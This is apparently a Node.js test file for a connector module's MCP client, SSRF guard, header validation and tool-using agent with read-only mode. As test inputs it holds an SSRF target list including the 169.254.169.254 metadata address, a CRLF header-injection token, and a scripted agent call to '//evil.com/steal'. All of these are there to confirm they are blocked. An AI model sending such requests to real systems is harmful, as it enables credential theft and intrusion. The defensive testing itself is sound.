'use strict';
process.env.CONNECT_ALLOW_PRIVATE = '1';
const test = require('node:test');
const assert = require('node:assert');
const http = require('http');
const C = require('../connect');

function server(handler) {
  return new Promise((res) => { const s = http.createServer(handler); s.listen(0, '127.0.0.1', () => res({ s, url: 'http://127.0.0.1:' + s.address().port })); });
}
const readBody = (req) => new Promise((r) => { let b = ''; req.on('data', (c) => (b += c)); req.on('end', () => r(b ? JSON.parse(b) : null)); });
const TOOLS = [
  { name: 'read_notes', description: 'read', inputSchema: { type: 'object', properties: { q: { type: 'string' } } }, annotations: { readOnlyHint: true } },
  { name: 'send_mail', description: 'send', inputSchema: { type: 'object', properties: { to: { type: 'string' } } } },
];
async function fakeMcp({ sse }) {
  const seen = [];
  const srv = await server(async (req, res) => {
    const m = await readBody(req); seen.push({ m, sid: req.headers['mcp-session-id'], auth: req.headers.authorization });
    if (!m.id) { res.writeHead(202); return res.end(); }
    let result;
    if (m.method === 'initialize') result = { protocolVersion: '2025-03-26', capabilities: {}, serverInfo: { name: 'x', version: '1' } };
    else if (m.method === 'tools/list') result = { tools: TOOLS };
    else if (m.method === 'tools/call') result = { content: [{ type: 'text', text: 'called ' + m.params.name }] };
    const body = JSON.stringify({ jsonrpc: '2.0', id: m.id, result });
    const h = { 'Mcp-Session-Id': 'S1', 'Content-Type': sse ? 'text/event-stream' : 'application/json' };
    res.writeHead(200, h);
    if (sse) { res.write('event: message\ndata: ' + body + '\n\n'); /* stream stays open on purpose */ } else res.end(body);
  });
  return { ...srv, seen };
}

test('private addresses are recognised', () => {
  for (const ip of ['127.0.0.1', '10.1.2.3', '192.168.0.9', '169.254.169.254', '172.20.0.1', '100.64.0.1', '::1', 'fd00::1', '::ffff:127.0.0.1']) assert.ok(C.isPrivateIp(ip), ip);
  for (const ip of ['8.8.8.8', '1.1.1.1', '2606:4700:4700::1111']) assert.ok(!C.isPrivateIp(ip), ip);
});
test('SSRF: localhost / metadata blocked when private mode is off', async () => {
  process.env.CONNECT_ALLOW_PRIVATE = '0';
  try {
    for (const u of ['https://localhost/x', 'https://127.0.0.1/x', 'https://169.254.169.254/latest', 'https://[::1]/x', 'http://example.com/x', 'https://u:p@example.com/x'])
      await assert.rejects(C.request(u, { timeoutMs: 2000 }), undefined, u);
  } finally { process.env.CONNECT_ALLOW_PRIVATE = '1'; }
});
test('headers: CRLF / bad names rejected, bearer built', () => {
  assert.throws(() => C.buildHeaders({ authType: 'bearer', token: 'a\r\nX: y' }));
  assert.throws(() => C.buildHeaders({ authType: 'header', token: 't', headerName: 'Host' }));
  assert.throws(() => C.buildHeaders({ authType: 'none', headers: { 'X-A': 'v\nw' } }));
  assert.strictEqual(C.buildHeaders({ authType: 'bearer', token: 'abc' }).Authorization, 'Bearer abc');
});
test('redirect to another origin does not forward the token', async () => {
  let got = 'none';
  const b = await server((req, res) => { got = req.headers.authorization || 'none'; res.end('ok'); });
  const a = await server((req, res) => { res.writeHead(302, { Location: b.url + '/x' }); res.end(); });
  const r = await C.request(a.url + '/', { headers: { Authorization: 'Bearer SECRET' } });
  assert.strictEqual(r.text, 'ok'); assert.strictEqual(got, 'none');
  a.s.close(); b.s.close();
});
for (const sse of [false, true]) {
  test('MCP client works with ' + (sse ? 'SSE (stream left open)' : 'JSON') + ' replies', async () => {
    const f = await fakeMcp({ sse });
    const c = C.mcpClient({ url: f.url + '/mcp', headers: { Authorization: 'Bearer T' } });
    const tools = await c.listTools();
    assert.deepStrictEqual(tools.map((t) => t.name), ['read_notes', 'send_mail']);
    assert.strictEqual((await c.callTool('read_notes', {})).text, 'called read_notes');
    assert.ok(f.seen.some((x) => x.m.method === 'notifications/initialized'));
    assert.ok(f.seen.filter((x) => x.m.method === 'tools/call').every((x) => x.sid === 'S1' && x.auth === 'Bearer T'));
    f.s.close(); f.s.closeAllConnections && f.s.closeAllConnections();
  });
}
function scripted(replies) { let i = 0; return { text: async () => replies[Math.min(i++, replies.length - 1)] }; }

test('agent: calls a read tool then reports', async () => {
  const f = await fakeMcp({});
  const app = { id: 'a1', name: 'Notes App', kind: 'mcp', url: f.url + '/mcp', headers: {}, host: f.url };
  const r = await C.runAgent({ instruction: 'read my notes', apps: [app], allowWrite: false, llm: scripted(['{"call":{"tool":"notes_app__read_notes","args":{"q":"x"}}}', '```json\n{"final":"done: notes mil gaye"}\n```']) });
  assert.strictEqual(r.ok, true); assert.match(r.text, /notes mil gaye/); assert.strictEqual(r.steps.length, 1); assert.match(r.steps[0].result, /called read_notes/);
  f.s.close(); f.s.closeAllConnections && f.s.closeAllConnections();
});
test('agent: change tools are BLOCKED unless allowWrite is on', async () => {
  const f = await fakeMcp({});
  const app = { id: 'a2', name: 'Mail', kind: 'mcp', url: f.url + '/mcp', headers: {}, host: f.url };
  const call = '{"call":{"tool":"mail__send_mail","args":{"to":"a@b.c"}}}';
  const blocked = await C.runAgent({ instruction: 'send mail please', apps: [app], allowWrite: false, llm: scripted([call, '{"final":"nahi bhej paaya"}']) });
  assert.strictEqual(blocked.steps[0].blocked, true);
  assert.ok(!f.seen.some((x) => x.m.method === 'tools/call'));
  const allowed = await C.runAgent({ instruction: 'send mail please', apps: [app], allowWrite: true, llm: scripted([call, '{"final":"bhej diya"}']) });
  assert.strictEqual(allowed.steps[0].blocked, false);
  assert.ok(f.seen.some((x) => x.m.method === 'tools/call' && x.m.params.name === 'send_mail'));
  f.s.close(); f.s.closeAllConnections && f.s.closeAllConnections();
});
test('agent: REST tool stays on its own host, GET ok, POST blocked read-only, step limit enforced', async () => {
  const hits = [];
  const f = await server((req, res) => { hits.push(req.method + ' ' + req.url + ' ' + (req.headers.authorization || '')); res.end('{"hello":1}'); });
  const app = { id: 'r1', name: 'Api', kind: 'rest', url: f.url, headers: { Authorization: 'Bearer K' }, host: f.url };
  const r = await C.runAgent({ instruction: 'check the api', apps: [app], allowWrite: false, maxSteps: 3, llm: scripted([
    '{"call":{"tool":"api__http","args":{"method":"GET","path":"/v1/x","query":{"a":"1"}}}}',
    '{"call":{"tool":"api__http","args":{"method":"GET","path":"//evil.com/steal"}}}',
    '{"call":{"tool":"api__http","args":{"method":"DELETE","path":"/v1/x"}}}',
    '{"call":{"tool":"api__http","args":{"method":"GET","path":"/again"}}}']) });
  assert.deepStrictEqual(hits, ['GET /v1/x?a=1 Bearer K']);
  assert.strictEqual(r.ok, false); assert.match(r.text, /limit/i); assert.strictEqual(r.steps.length, 3);
  f.s.close();
});
test('agent: junk model output does not crash', async () => {
  const f = await fakeMcp({});
  const app = { id: 'a3', name: 'N', kind: 'mcp', url: f.url + '/mcp', headers: {}, host: f.url };
  const r = await C.runAgent({ instruction: 'whatever task', apps: [app], allowWrite: false, llm: scripted(['hmm', 'still not json']) });
  assert.strictEqual(r.ok, true); assert.match(r.text, /still not json/);
  f.s.close(); f.s.closeAllConnections && f.s.closeAllConnections();
});
